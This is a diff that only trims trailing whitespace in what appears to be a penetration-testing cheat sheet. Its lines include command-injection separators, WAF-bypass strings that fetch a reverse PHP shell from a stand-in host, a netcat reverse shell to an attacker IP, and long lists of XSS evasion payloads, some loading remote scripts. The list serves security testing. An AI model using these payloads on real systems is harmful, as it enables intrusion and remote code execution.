@@ -143,10 +143,10 @@ ver
 Both Unix and Windows
 
 ```sh
-ls||id; ls ||id; ls|| id; ls || id 
-ls|id; ls |id; ls| id; ls | id 
-ls&&id; ls &&id; ls&& id; ls && id 
-ls&id; ls &id; ls& id; ls & id 
+ls||id; ls ||id; ls|| id; ls || id
+ls|id; ls |id; ls| id; ls | id
+ls&&id; ls &&id; ls&& id; ls && id
+ls&id; ls &id; ls& id; ls & id
 ls %0A id
 ```
 
@@ -172,7 +172,7 @@ OOB (Out Of Band) Exploitation
 WAF Bypasses
 
 ```bash
-vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
+vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O
 /tmp/reverse.php %0a php /tmp/reverse.php
 vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
 vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
@@ -378,8 +378,8 @@ git secrets -register-aws
 git secrets — register-gcp
 
 # Scan Git
-git secrets --scan 
-git secrets --scan-history 
+git secrets --scan
+git secrets --scan-history
 git secrets --scan /path/to/file
 ```
 
@@ -392,7 +392,7 @@ git secrets --scan /path/to/file
 PAT=<GitHub PAT>
 ID=1
 while [ $ID -lt 1000000 ]
-do 
+do
     curl -L \
     -H "Accept: application/vnd.github+json" \
     -H "Authorization: Bearer $PAT" \
@@ -422,7 +422,7 @@ jobs:
     steps:
       - name: Checkout code
         uses: actions/checkout@v2
-        
+
       - name: Install Nmap
         run: sudo apt-get update && sudo apt-get install -y nmap
 
@@ -460,7 +460,7 @@ Use these strings on all input fields and identify what remains after filtering 
 <script\x0Ctype="text/javascript">javascript:alert(1);</script>
 <script\x2Ftype="text/javascript">javascript:alert(1);</script>
 <script\x0Atype="text/javascript">javascript:alert(1);</script>
-'`"><\x3Cscript>javascript:alert(1)</script>        
+'`"><\x3Cscript>javascript:alert(1)</script>  
 '`"><\x00script>javascript:alert(1)</script>
 <img src=1 href=1 onerror="javascript:alert(1)"></img>
 <audio src=1 href=1 onerror="javascript:alert(1)"></audio>
@@ -562,8 +562,8 @@ Use these strings on all input fields and identify what remains after filtering 
 <style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
 <style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
 <style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
-"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
-"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF
 %253Cscript%253Ealert('XSS')%253C%252Fscript%253E
 <script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
 <script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
@@ -1023,7 +1023,7 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
 <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
 <sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
-<img/src=`%00` onerror=this.onerror=confirm(1) 
+<img/src=`%00` onerror=this.onerror=confirm(1)
 <form><isindex formaction="javascript&colon;confirm(1)"
 <img src=`%00`&NewLine; onerror=alert(1)&NewLine;
 <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
@@ -1125,7 +1125,7 @@ http://www.<script>alert(1)</script .com
 <IMG SRC=jAVasCrIPt:alert(‘XSS’)>
 <IMG SRC=”javascript:alert(‘XSS’);”>
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
-<IMG SRC=javascript:alert(‘XSS’)>      
+<IMG SRC=javascript:alert(‘XSS’)>  
 <img src=xss onerror=alert(1)>
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
 <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
@@ -1747,7 +1747,7 @@ g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
 <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
 <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
 <sVg><scRipt >alert&lpar;1&rpar; {Opera}
-<img/src=`` onerror=this.onerror=confirm(1) 
+<img/src=`` onerror=this.onerror=confirm(1)
 <form><isindex formaction="javascript&colon;confirm(1)"
 <img src=``&NewLine; onerror=alert(1)&NewLine;
 <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
@@ -1849,7 +1849,7 @@ http://www.<script>alert(1)</script .com
 <script\x0Ctype="text/javascript">javascript:alert(1);</script>
 <script\x2Ftype="text/javascript">javascript:alert(1);</script>
 <script\x0Atype="text/javascript">javascript:alert(1);</script>
-'`"><\x3Cscript>javascript:alert(1)</script>        
+'`"><\x3Cscript>javascript:alert(1)</script>  
 '`"><\x00script>javascript:alert(1)</script>
 <img src=1 href=1 onerror="javascript:alert(1)"></img>
 <audio src=1 href=1 onerror="javascript:alert(1)"></audio>
@@ -1951,8 +1951,8 @@ http://www.<script>alert(1)</script .com
 <style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
 <style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
 <style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
-"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
-"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF
 <script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
 <script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
 <script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
@@ -2427,7 +2427,7 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
 <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
 <sVg><scRipt >alert&lpar;1&rpar; {Opera}
-<img/src=`` onerror=this.onerror=confirm(1) 
+<img/src=`` onerror=this.onerror=confirm(1)
 <form><isindex formaction="javascript&colon;confirm(1)"
 <img src=``&NewLine; onerror=alert(1)&NewLine;
 <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
@@ -2531,7 +2531,7 @@ http://www.google<script .com>alert(document.location)</script
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <scr<script>ipt>alert('XSS');</scr</script>ipt>
-<script>alert(String.fromCharCode(88,83,83))</script> 
+<script>alert(String.fromCharCode(88,83,83))</script>
 <img src=foo.png onerror=alert(/xssed/) />
 <style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
 <? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
@@ -2689,7 +2689,7 @@ a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:
 &lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
 &lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
 &lt;HTML&gt;&lt;BODY&gt;
-&lt;!--[if gte IE 4]&gt;               
+&lt;!--[if gte IE 4]&gt;  
 &lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
 &lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;
 &lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
@@ -2910,7 +2910,7 @@ a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";
 <;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:alert(';XSS';)";>;<;/B>;<;/I>;<;/XML>;
 <;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I>;<;/XML>;
 <;HTML>;<;BODY>;
-<;!--[if gte IE 4]>;           
+<;!--[if gte IE 4]>;  
 <;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;";>;
 <;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";>;
 <;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
@@ -3090,7 +3090,7 @@ XSS STYLE=xss:e/**/xpression(alert('XSS'))>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
 <IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
-<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>    
+<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>  
 <IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
 <IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
 <IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
@@ -3106,7 +3106,7 @@ XSS STYLE=xss:e/**/xpression(alert('XSS'))>
 %22%3e%3cscript%3ealert('XSS')%3c/script%3e
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
-<IMG SRC=javascript:alert('XSS')>       
+<IMG SRC=javascript:alert('XSS')>  
 <img src=xss onerror=alert(1)>
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
